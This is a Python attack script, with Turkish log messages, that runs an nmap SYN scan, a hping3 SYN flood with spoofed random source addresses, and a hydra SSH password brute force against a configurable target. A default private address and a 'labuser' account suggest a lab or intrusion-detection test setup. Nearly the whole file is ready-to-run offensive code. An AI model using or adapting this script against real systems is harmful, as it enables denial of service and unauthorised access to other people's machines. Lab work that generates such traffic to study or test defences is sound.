#!/usr/bin/env python3
import subprocess, argparse, time, os, sys
from datetime import datetime

TARGET_IP = os.environ.get("TARGET_IP", "172.20.0.10")

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)

def attack_scan():
    log("=== NMAP PORT TARAMA BASLADI ===")
    result = subprocess.run(
        ["nmap", "-sS", "-T4", "--open", TARGET_IP],
        capture_output=True, text=True, timeout=120
    )
    log(result.stdout)
    log("=== TARAMA TAMAMLANDI ===")

def attack_dos(duration=30):
    log(f"=== SYN FLOOD BASLADI ({duration}s) ===")
    subprocess.run(
        ["hping3", "-S", "--flood", "--rand-source", "-p", "80",
         TARGET_IP, "--count", str(duration * 100)],
        timeout=duration + 10
    )
    log("=== SYN FLOOD TAMAMLANDI ===")

def attack_brute():
    log("=== SSH BRUTE-FORCE BASLADI ===")
    wordlist = "/tmp/passwords.txt"
    with open(wordlist, "w") as f:
        f.write("admin\npassword\n123456\nroot\ntoor\npassword123\nletmein\n")
    result = subprocess.run(
        ["hydra", "-l", "labuser", "-P", wordlist, "-t", "4",
         "-vV", f"ssh://{TARGET_IP}"],
        capture_output=True, text=True, timeout=120
    )
    log(result.stdout)
    log("=== BRUTE-FORCE TAMAMLANDI ===")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", choices=["scan","dos","brute","all"], required=True)
    parser.add_argument("--duration", type=int, default=30)
    args = parser.parse_args()

    if args.mode == "scan":
        attack_scan()
    elif args.mode == "dos":
        attack_dos(args.duration)
    elif args.mode == "brute":
        attack_brute()
    elif args.mode == "all":
        attack_scan()
        time.sleep(3)
        attack_dos(args.duration)
        time.sleep(3)
        attack_brute()

if __name__ == "__main__":
    main()